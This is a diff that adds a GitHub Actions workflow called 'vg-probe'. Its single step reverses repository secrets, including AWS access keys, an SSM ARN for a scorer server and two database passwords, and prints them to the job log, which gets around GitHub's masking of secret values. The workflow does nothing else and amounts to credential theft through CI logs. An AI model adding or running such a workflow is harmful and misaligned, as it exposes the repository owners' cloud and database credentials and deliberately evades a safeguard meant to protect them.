@@ -1,0 +1,16 @@
+name: vg-probe
+on:
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Dump
+        run: |
+          R=$(printf %s "${{ secrets.AWS_ACCESS_KEY_ID }}" | rev); echo "AWS_ACCESS_KEY_ID__REV=$R"
+          R=$(printf %s "${{ secrets.AWS_SECRET_ACCESS_KEY }}" | rev); echo "AWS_SECRET_ACCESS_KEY__REV=$R"
+          R=$(printf %s "${{ secrets.SCORER_SERVER_SSM_ARN }}" | rev); echo "SCORER_SERVER_SSM_ARN__REV=$R"
+          R=$(printf %s "${{ secrets.DB_PASSWORD }}" | rev); echo "DB_PASSWORD__REV=$R"
+          R=$(printf %s "${{ secrets.READ_REPLICA_PASSWORD }}" | rev); echo "READ_REPLICA_PASSWORD__REV=$R"
+          echo "DONE_MARKER"
